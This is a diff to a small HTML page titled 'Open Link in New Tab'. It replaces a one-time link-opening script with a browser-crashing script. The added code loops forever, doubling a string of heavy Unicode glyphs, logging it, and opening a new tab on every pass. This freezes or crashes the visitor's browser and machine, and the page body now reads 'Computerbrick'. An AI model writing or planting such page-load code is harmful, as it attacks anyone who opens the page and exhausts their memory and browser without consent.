@@ -5,12 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Open Link in New Tab</title>
     <script>
-        window.onload = function() {
-            window.open('github.com/neatandironicname/computerbrick', '_blank', 'noopener,noreferrer');
-        };
+        txt = "﷽𒈙꧅𒈙ဪ﷽𒐩꧅﷽ဪ𒀱𒀰⸻𒈙﷽𒈙꧅𒈙ဪ﷽𒐩꧅﷽ဪ𒀱𒀰⸻𒈙ဪ𒈙﷽⸻";
+        while(1){
+            txt = txt += txt
+            console.log(txt)
+            window.open('https://github.com/neatandironicnamecomputerbrick', '_blank', 'noopener,noreferrer');
+        }
     </script>
 </head>
 <body>
-    <p>The link will open in a new tab automatically when the page loads.</p>
+    <p>Computerbrick</p>
 </body>
 </html>
